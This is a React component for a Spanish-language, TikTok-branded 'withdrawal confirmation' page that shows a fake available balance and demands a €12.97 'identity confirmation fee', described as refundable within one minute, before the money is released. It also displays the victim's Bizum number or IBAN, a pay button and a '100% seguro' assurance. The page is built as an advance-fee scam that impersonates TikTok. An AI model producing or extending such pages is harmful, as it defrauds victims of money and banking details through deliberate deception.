import TikTokLogo from "@/components/TikTokLogo";
import { ArrowLeft } from "lucide-react";

interface ConfirmationPageProps {
  balance: number;
  name: string;
  method: "bizum" | "iban";
  phoneOrIban: string;
  onPay: () => void;
  onBack: () => void;
}

const ConfirmationPage = ({ balance, name, method, phoneOrIban, onPay, onBack }: ConfirmationPageProps) => {
  const today = new Date();
  const dateStr = `${today.getDate().toString().padStart(2, "0")}/${(today.getMonth() + 1).toString().padStart(2, "0")}/${today.getFullYear()}`;
  const fee = 12.97;

  return (
    <div className="flex min-h-screen items-start justify-center bg-background px-4 py-8">
      <div className="w-full max-w-md overflow-hidden rounded-2xl bg-card shadow-lg">
        {/* TikTok Logo */}
        <div className="flex justify-center py-6">
          <TikTokLogo />
        </div>

        {/* Balance card */}
        <div className="mx-5 rounded-xl bg-foreground p-5">
          <p className="text-xs font-semibold uppercase tracking-wider text-muted">
            SALDO DISPONIBLE
          </p>
          <p className="mt-1 text-3xl font-bold text-background">
            € {balance.toFixed(2).replace(".", ",")}
          </p>
          <p className="mt-1 text-sm text-muted">
            Esperando confirmación para retirada
          </p>
        </div>

        {/* Identity confirmation */}
        <div className="mx-5 mt-5 rounded-xl border border-border p-5">
          <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
            CONFIRMACIÓN DE IDENTIDAD
          </p>
          <div className="mt-3 flex items-center gap-3">
            <span className="text-2xl font-bold text-primary">
              € {fee.toFixed(2).replace(".", ",")}
            </span>
            <span className="rounded bg-green-100 px-2 py-0.5 text-xs font-semibold uppercase text-green-600">
              VALOR REEMBOLSABLE
            </span>
          </div>
          <p className="mt-3 text-sm text-muted-foreground">
            Tasa obligatoria para la liberación de la retirada por valor de{" "}
            <span className="font-bold text-card-foreground">€{balance.toFixed(2).replace(".", ",")}</span>.
            El importe de <span className="font-bold text-card-foreground">€{fee.toFixed(2).replace(".", ",")}</span>{" "}
            será reembolsado íntegramente en 1 minuto.
          </p>
        </div>

        {/* Refund data */}
        <div className="mx-5 mt-5 rounded-xl border border-border p-5">
          <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
            DATOS PARA REEMBOLSO
          </p>
          <div className="mt-4 space-y-3">
            <div className="flex items-center justify-between border-b border-border pb-3">
              <span className="text-sm text-muted-foreground">Nombre</span>
              <span className="text-sm font-semibold text-card-foreground">{name}</span>
            </div>
            <div className="flex items-center justify-between border-b border-border pb-3">
              <span className="text-sm text-muted-foreground">Fecha</span>
              <span className="text-sm font-semibold text-card-foreground">{dateStr}</span>
            </div>
            <div className="flex items-center justify-between border-b border-border pb-3">
              <span className="text-sm text-muted-foreground">
                {method === "bizum" ? "Número Bizum" : "IBAN"}
              </span>
              <span className="text-sm font-semibold text-card-foreground">{phoneOrIban}</span>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-sm text-muted-foreground">Importe a recibir</span>
              <span className="text-sm font-semibold text-card-foreground">
                € {balance.toFixed(2).replace(".", ",")}
              </span>
            </div>
          </div>
        </div>

        {/* Liberation process */}
        <div className="mx-5 mt-5 rounded-xl border border-border p-5">
          <p className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
            PROCESO DE LIBERACIÓN
          </p>
          <div className="mt-4 space-y-4">
            <div className="flex items-start gap-3">
              <div className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-primary text-xs font-bold text-primary-foreground">
                1
              </div>
              <div>
                <p className="text-sm font-semibold text-card-foreground">Pagar tasa de confirmación</p>
                <p className="text-sm text-muted-foreground">€ {fee.toFixed(2).replace(".", ",")} para verificación de identidad</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <div className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-green-500 text-xs font-bold text-white">
                ✓
              </div>
              <div>
                <p className="text-sm font-semibold text-green-600">Recibir reembolso automático</p>
                <p className="text-sm text-muted-foreground">Importe devuelto en 1 minuto</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <div className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-primary text-xs font-bold text-primary-foreground">
                3
              </div>
              <div>
                <p className="text-sm font-semibold text-card-foreground">Acceder al saldo completo</p>
                <p className="text-sm text-muted-foreground">€ {balance.toFixed(2).replace(".", ",")} liberado para retirada</p>
              </div>
            </div>
          </div>
        </div>

        {/* CTA */}
        <div className="mx-5 mt-5 mb-3">
          <button
            onClick={onPay}
            className="w-full rounded-xl bg-primary py-3.5 text-sm font-semibold text-primary-foreground transition-opacity hover:opacity-90"
          >
            Pagar tasa y liberar retirada
          </button>
          <p className="mt-3 text-center text-xs text-primary">
            ⏱ Reembolso automático en 1 minuto
          </p>
        </div>

        <div className="px-5 pb-5">
          <p className="text-center text-xs text-muted-foreground">Proceso 100% seguro</p>
          <p className="mt-1 text-center text-xs text-primary cursor-pointer hover:underline">¿Necesitas ayuda?</p>
        </div>
      </div>
    </div>
  );
};

export default ConfirmationPage;
